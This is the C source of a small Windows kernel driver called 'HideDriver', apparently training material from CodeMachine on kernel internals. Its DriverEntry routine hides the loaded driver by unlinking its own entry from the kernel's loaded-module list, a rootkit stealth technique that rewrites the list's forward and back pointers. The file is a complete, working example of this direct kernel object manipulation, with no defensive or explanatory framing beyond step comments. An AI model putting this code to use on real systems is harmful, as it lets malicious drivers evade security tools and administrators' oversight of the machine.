/////////////////////////////////////////////////////////////////////////////
//
// Copyright (c) 2000-2014 CodeMachine Incorporated. All rights Reserved.
// Developed by CodeMachine Incorporated. (www.codemachine.com)
//
/////////////////////////////////////////////////////////////////////////////

#include "ntifs.h"
#include "stdio.h"

#define __MODULE__  "HideDriver"
#define DPF(x)      DbgPrint x

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY  Links;
    PVOID ExceptionDirectoryBase;
    ULONG ExceptionDirectorySize;
    ULONG Reserved1[3];
    PVOID Reserved2;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONGLONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

NTSTATUS 
DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath )
{
    PKLDR_DATA_TABLE_ENTRY LdrDataTableEntry = NULL;
    PLIST_ENTRY PrevListEntry;
    PLIST_ENTRY NextListEntry;

    UNREFERENCED_PARAMETER(RegistryPath);

    DPF(( "*** %s.sys Loaded ***\n", __MODULE__ ));

    // Step #1 : Get a pointer to the PKLDR_DATA_TABLE_ENTRY for this driver
    LdrDataTableEntry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

    // Step #2 : Retrieve Pointers to the LIST_ENTRY structure for 
    // the previous and next nodes in the module list
    PrevListEntry = LdrDataTableEntry->Links.Blink;
    NextListEntry = LdrDataTableEntry->Links.Flink;

    // Step #3 : Modify the previous and next LIST_ENTRY structures to remove 
    // the node for the driver from the module list
    PrevListEntry->Flink = NextListEntry;
    NextListEntry->Blink = PrevListEntry;

    return STATUS_SUCCESS;
} // DriverEntry()

